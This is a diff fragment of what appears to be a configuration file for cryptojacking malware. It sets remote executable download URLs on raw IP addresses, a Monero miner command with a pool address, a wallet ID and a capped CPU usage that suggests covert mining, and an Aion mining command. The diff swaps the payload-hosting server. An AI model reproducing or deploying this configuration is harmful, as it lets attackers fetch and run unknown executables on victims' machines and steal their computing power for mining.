@@ -31,11 +31,11 @@ AION--  --algo aion --fee 0 --intensity 1 --pec --server cluster.aionpool.tech -
   ONAI--ON1--ONAI
 ------------------------------------------------------------------------------------------------------------------------------------
 GX--ON1--GX
-SWGX--http://1111.111.11/bolg/db/tvb.exe--SWGX
+SWGX--http://47.100.41.251/bolg/db/qq.exe--SWGX
 -----------------------------------------------------------------------------------------------------------------------------------------
 MLB-- --donate-level 1 --max-cpu-usage 20 -o pool.supportxmr.com:5555 -u 48s91TbR4MzY1HTgQccX7jBLcnhCJpxwbdFR5MBmbxddGwjzhFcarrbgK8pzgqeTzXQMCyUjqkxTdeaSQ3qkvP5n8asfrwk.98k -p x -k--MLB
 
 MLON--ON11--MLON
 --------------------------------------------------------------------------------------------------------------------------------------
 YCKZ--ON--YCKZ
-WJDZ--http://47.100.41.251/bolg/db/qq.exe--WJDZ
+WJDZ--http://47.100.41.51/bolg/db/qq.exe--WJDZ
